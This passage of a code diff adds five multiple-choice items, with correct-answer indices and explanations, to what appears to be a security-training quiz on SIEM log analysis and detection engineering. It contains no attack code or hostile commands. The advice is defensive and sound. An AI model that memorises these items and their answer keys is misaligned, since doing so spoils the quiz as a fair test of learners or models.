+          correctAnswer: 1,
+          explanation: "Treat parsers like code: dev → test → prod with a rollback. Vendor format changes are the single most common cause of silent detection failures (rules look healthy but match nothing)."
+        },
+        {
+          id: "la-q5-6",
+          difficulty: "medium",
+          tags: ["Detection Hygiene", "False Positives"],
+          scenario: "A 'mass file access' detection fires 200×/day, 95% from one backup agent (svc_backup) on backup hosts during 22:00–02:00.",
+          question: "Best response?",
+          options: [
+            "Disable the rule.",
+            "Tune: add an allowlist for svc_backup ON the known backup hosts during the backup window, keep the rule firing for everyone/everywhere else. Document the exclusion in the rule comments.",
+            "Lower the threshold.",
+            "Ignore the alerts manually.",
+          ],
+          correctAnswer: 1,
+          explanation: "Disabling (A) loses real detection. The correct discipline is scoped allowlisting (user + host + window) with a comment trail so the exclusion can be audited and revisited. Lowering thresholds (C) makes noise worse."
+        },
+        {
+          id: "la-q5-7",
+          difficulty: "medium",
+          tags: ["Retention", "Cost"],
+          scenario: "Your SIEM hot tier is at 95% capacity. CFO wants spend cut 30%. Logs include 60% verbose application DEBUG that no detection uses.",
+          question: "Best architectural fix?",
+          options: [
+            "Buy more hot storage.",
+            "Tiered retention: route DEBUG/INFO to cold/cheap object storage (or a data lake) with on-demand search; keep auth/audit/EDR/network on hot for 30–90 days; archive older to cold. Detections continue uninterrupted.",
+            "Stop logging.",
+            "Delete logs older than 24h.",
+          ],
+          correctAnswer: 1,
+          explanation: "Tiered architecture (hot SIEM + cold data lake) is the standard cost-control answer. Security-relevant data stays fast; verbose dev data is preserved cheaply and searchable on-demand for incident timelines."
+        },
+        {
+          id: "la-q5-8",
+          difficulty: "hard",
+          tags: ["Detection Engineering", "Sigma"],
+          question: "Why is writing a detection in Sigma (vendor-neutral YAML) preferred over writing it natively in one SIEM's query language for a security team that runs Splunk today but is piloting Sentinel?",
+          options: [
+            "Sigma is faster at runtime.",
+            "Sigma is portable — one rule converts (sigmac / pySigma) to Splunk SPL, KQL, Elastic EQL, etc. The detection logic, not the syntax, becomes the source of truth, and the team can switch/multi-SIEM without rewriting the library.",
+            "Sigma has fewer false positives.",
+            "Sigma is required by PCI.",
+          ],
+          correctAnswer: 1,
+          explanation: "Vendor lock-in is the silent killer of detection libraries. Sigma captures the logic once; converters emit per-vendor syntax. The team can run dual-SIEM during migration without doubling engineering work."
+        },
+        {
+          id: "la-q5-9",
+          difficulty: "hard",
+          tags: ["Operational", "Alert Triage"],
+          scenario: "Your queue holds 480 alerts across 4 analysts on shift. Many are repeats of the same underlying event.",
+          question: "Most impactful operational fix?",
+          options: [
+            "Hire 4 more analysts.",
+            "Aggregate alerts into incidents (group by entity + technique + time window), tune the top noise-makers, and add suppression for known benign patterns — analyst capacity is wasted on duplicate triage, not on real cases.",
+            "Disable the noisy detections.",
+            "Stop ingesting noisy sources.",
+          ],
+          correctAnswer: 1,
+          explanation: "Alert-to-incident aggregation + targeted tuning is the proven analyst-capacity multiplier. Hiring (A) treats symptoms; disabling sources/detections (C,D) loses coverage. Track 'time to triage' and 'alerts per incident' as the operational KPIs."
+        },
+        {
+          id: "la-q5-10",
+          difficulty: "hard",
+          tags: ["Best Practice", "Time Sync"],
+          scenario: "Post-incident review: your timeline is 11 minutes off between firewall and EDR, making causality ambiguous in the report.",
+          question: "Root cause and durable fix?",
+          options: [
+            "Reformat the report.",
+            "Clock drift — firewall NTP source disagreed with the EDR's. Enforce a single authoritative NTP/PTP source for every log-producing system, monitor drift via a SIEM detection (e.g. event_time vs ingest_time > 60s), and standardize on UTC.",
+            "Use a faster firewall.",
+            "Ignore time fields in the report.",
+          ],
+          correctAnswer: 1,
+          explanation: "Drift is silent and lethal to investigations. Single NTP source + drift monitoring + UTC everywhere is the fix. Add a regular detection on 'ingest_time - event_time' to catch sources whose clocks slip."
+        },
     ]
   },
 
